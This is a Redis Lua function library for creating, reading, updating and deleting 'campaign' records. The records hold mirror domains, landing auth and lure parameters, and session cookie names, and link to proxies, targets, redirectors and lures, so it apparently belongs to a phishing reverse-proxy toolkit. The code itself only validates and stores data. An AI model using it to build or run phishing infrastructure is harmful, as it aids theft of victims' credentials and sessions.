#!lua name=campaign

--[[
  Create campaign
--]]
local function create_campaign(keys, args)
  if not (#keys == 3 and #args == 11) then
    return redis.error_reply('ERR Wrong function use')
  end

  local campaign_key = keys[1]
  local campaign_unique_mirror_domain_key = keys[2]
  local campaign_index_key = keys[3]

  if not (redis.call('EXISTS', campaign_key) == 0) then
    return redis.status_reply('CONFLICT Campaign allready exists')
  end

  local model = {
    campaign_id = args[1],
    mirror_domain = args[2],
    description = args[3],
    landing_auth_path = args[4],
    landing_auth_param = args[5],
    landing_lure_param = args[6],
    session_cookie_name = args[7],
    session_expire = tonumber(args[8]),
    new_session_expire = tonumber(args[9]),
    message_expire = tonumber(args[10]),
    session_count = 0,
    message_count = 0,
    created_at = tonumber(args[11]),
    updated_at = tonumber(args[11]),
  }

  for field, value in pairs(model) do
    if not value then
      return redis.error_reply('ERR Wrong model.' .. field)
    end
  end

  if not (#model.campaign_id > 0) then
    return redis.error_reply('ERR Wrong model.campaign_id')
  end

  if not (#model.mirror_domain > 0) then
    return redis.error_reply('ERR Wrong model.mirror_domain')
  end

  if not (model.session_expire > 0) then
    return redis.error_reply('ERR Wrong model.session_expire')
  end

  if not (model.new_session_expire > 0) then
    return redis.error_reply('ERR Wrong model.new_session_expire')
  end

  if not (model.message_expire > 0) then
    return redis.error_reply('ERR Wrong model.message_expire')
  end

  if not (redis.call('SISMEMBER', campaign_unique_mirror_domain_key, model.mirror_domain) == 0) then
    return redis.status_reply('CONFLICT Campaign mirror_domain allready taken')
  end

  -- Point of no return

  local store = {}

  for field, value in pairs(model) do
    table.insert(store, field)
    table.insert(store, value)
  end

  redis.call('HSET', campaign_key, unpack(store))

  redis.call('ZADD', campaign_index_key, model.created_at, model.campaign_id)

  return redis.status_reply('OK Campaign created')
end

redis.register_function({
  function_name = 'create_campaign',
  callback = create_campaign,
  description = 'Create campaign',
})

--[[
  Read campaign
--]]
local function read_campaign(keys, args)
  if not (#keys == 1 and #args == 0) then
    return redis.error_reply('ERR Wrong function use')
  end

  local campaign_key = keys[1]

  if not (redis.call('EXISTS', campaign_key) == 1) then
    return nil
  end

  -- stylua: ignore
  local values = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain',
    'session_count',
    'message_count',
    'created_at',
    'updated_at'
  )

  if not (#values == 6) then
    return redis.error_reply('ERR Malform values')
  end

  local model = {
    campaign_id = values[1],
    mirror_domain = values[2],
    session_count = tonumber(values[3]),
    message_count = tonumber(values[4]),
    created_at = tonumber(values[5]),
    updated_at = tonumber(values[6]),
  }

  for field, value in pairs(model) do
    if not value then
      return redis.error_reply('ERR Malform model.' .. field)
    end
  end

  return { map = model }
end

redis.register_function({
  function_name = 'read_campaign',
  callback = read_campaign,
  flags = { 'no-writes' },
  description = 'Read campaign',
})

--[[
  Read full campaign
--]]
local function read_full_campaign(keys, args)
  if not (#keys == 5 and #args == 0) then
    return redis.error_reply('ERR Wrong function use')
  end

  local campaign_key = keys[1]
  local proxy_index_key = keys[2]
  local target_index_key = keys[3]
  local redirector_index_key = keys[4]
  local lure_index_key = keys[5]

  if not (redis.call('EXISTS', campaign_key) == 1) then
    return nil
  end

  -- stylua: ignore
  local values = redis.call(
    'HMGET', campaign_key,
    'campaign_id',
    'mirror_domain',
    'description',
    'landing_auth_path',
    'landing_auth_param',
    'landing_lure_param',
    'session_cookie_name',
    'session_expire',
    'new_session_expire',
    'message_expire',
    'session_count',
    'message_count',
    'created_at',
    'updated_at'
  )

  if not (#values == 14) then
    return redis.error_reply('ERR Malform values')
  end

  local model = {
    campaign_id = values[1],
    mirror_domain = values[2],
    description = values[3],
    landing_auth_path = values[4],
    landing_auth_param = values[5],
    landing_lure_param = values[6],
    session_cookie_name = values[7],
    session_expire = tonumber(values[8]),
    new_session_expire = tonumber(values[9]),
    message_expire = tonumber(values[10]),
    proxy_count = redis.call('ZCARD', proxy_index_key),
    target_count = redis.call('ZCARD', target_index_key),
    redirector_count = redis.call('ZCARD', redirector_index_key),
    lure_count = redis.call('ZCARD', lure_index_key),
    session_count = tonumber(values[11]),
    message_count = tonumber(values[12]),
    created_at = tonumber(values[13]),
    updated_at = tonumber(values[14]),
  }

  for field, value in pairs(model) do
    if not value then
      return redis.error_reply('ERR Malform model.' .. field)
    end
  end

  return { map = model }
end

redis.register_function({
  function_name = 'read_full_campaign',
  callback = read_full_campaign,
  flags = { 'no-writes' },
  description = 'Read full campaign',
})

--[[
  Read campaign index
--]]
local function read_campaign_index(keys, args)
  if not (#keys == 1 and #args == 0) then
    return redis.error_reply('ERR Wrong function use')
  end

  local campaign_index_key = keys[1]

  return redis.call('ZRANGE', campaign_index_key, 0, -1)
end

redis.register_function({
  function_name = 'read_campaign_index',
  callback = read_campaign_index,
  flags = { 'no-writes' },
  description = 'Read campaign index',
})

--[[
  Update campaign
--]]
local function update_campaign(keys, args)
  if not (#keys == 1 and #args >= 0 and #args % 2 == 0) then
    return redis.error_reply('ERR Wrong function use')
  end

  local campaign_key = keys[1]

  if not (redis.call('EXISTS', campaign_key) == 1) then
    return redis.status_reply('NOT_FOUND Campaign not found')
  end

  local model = {}

  for i = 1, #args, 2 do
    local field, value = args[i], args[i + 1]

    if model[field] then
      return redis.error_reply('ERR Duplicate model.' .. field)
    end

    if field == 'description' then
      model.description = value

      if not model.description then
        return redis.error_reply('ERR Wrong model.description')
      end
    elseif field == 'session_expire' then
      model.session_expire = tonumber(value)

      if not (model.session_expire and model.session_expire > 0) then
        return redis.error_reply('ERR Wrong model.session_expire')
      end
    elseif field == 'new_session_expire' then
      model.new_session_expire = tonumber(value)

      if not (model.new_session_expire and model.new_session_expire > 0) then
        return redis.error_reply('ERR Wrong model.new_session_expire')
      end
    elseif field == 'message_expire' then
      model.message_expire = tonumber(value)

      if not (model.message_expire and model.message_expire > 0) then
        return redis.error_reply('ERR Wrong model.message_expire')
      end
    elseif field == 'updated_at' then
      model.updated_at = tonumber(value)

      if not model.updated_at then
        return redis.error_reply('ERR Wrong model.updated_at')
      end
    else
      return redis.error_reply('ERR Unknown model.' .. field)
    end
  end

  if next(model) == nil then
    return redis.status_reply('OK Nothing to update')
  end

  -- Point of no return

  local store = {}

  for field, value in pairs(model) do
    table.insert(store, field)
    table.insert(store, value)
  end

  redis.call('HSET', campaign_key, unpack(store))

  return redis.status_reply('OK Campaign updated')
end

redis.register_function({
  function_name = 'update_campaign',
  callback = update_campaign,
  description = 'Update campaign',
})

--[[
  Delete campaign
--]]
local function delete_campaign(keys, args)
  if not (#keys == 7 and #args == 0) then
    return redis.error_reply('ERR Wrong function use')
  end

  local campaign_key = keys[1]
  local campaign_unique_mirror_domain_key = keys[2]
  local campaign_index_key = keys[3]
  local proxy_index_key = keys[4]
  local target_index_key = keys[5]
  local redirector_index_key = keys[6]
  local lure_index_key = keys[7]

  if not (redis.call('EXISTS', campaign_key) == 1) then
    return redis.status_reply('NOT_FOUND Campaign not found')
  end

  if not (redis.call('ZCARD', proxy_index_key) == 0) then
    return redis.status_reply('FORBIDDEN Campaign proxies exists')
  end

  if not (redis.call('ZCARD', target_index_key) == 0) then
    return redis.status_reply('FORBIDDEN Campaign targets exists')
  end

  if not (redis.call('ZCARD', redirector_index_key) == 0) then
    return redis.status_reply('FORBIDDEN Campaign redirectors exists')
  end

  if not (redis.call('ZCARD', lure_index_key) == 0) then
    return redis.status_reply('FORBIDDEN Campaign lures exists')
  end

  local stash = {
    campaign_id = redis.call('HGET', campaign_key, 'campaign_id'),
    mirror_domain = redis.call('HGET', campaign_key, 'mirror_domain'),
  }

  if not (stash.campaign_id and #stash.campaign_id > 0) then
    return redis.error_reply('ERR Malform stash.campaign_id')
  end

  if not (stash.mirror_domain and #stash.mirror_domain > 0) then
    return redis.error_reply('ERR Malform stash.mirror_domain')
  end

  -- Point of no return

  redis.call('DEL', campaign_key)

  redis.call('SREM', campaign_unique_mirror_domain_key, stash.mirror_domain)

  redis.call('ZREM', campaign_index_key, stash.campaign_id)

  return redis.status_reply('OK Campaign deleted')
end

redis.register_function({
  function_name = 'delete_campaign',
  callback = delete_campaign,
  description = 'Delete campaign',
})
